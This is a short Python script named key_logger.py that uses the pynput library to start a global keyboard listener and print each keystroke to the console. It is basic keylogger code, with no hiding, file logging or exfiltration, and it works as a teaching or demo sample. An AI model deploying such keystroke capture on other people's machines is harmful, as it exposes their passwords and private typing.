# key_logger.py
from pynput import keyboard

def on_press(key):
    try:
        print(f"[KEY PRESSED] {key.char}")
    except AttributeError:
        print(f"[KEY PRESSED] {key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
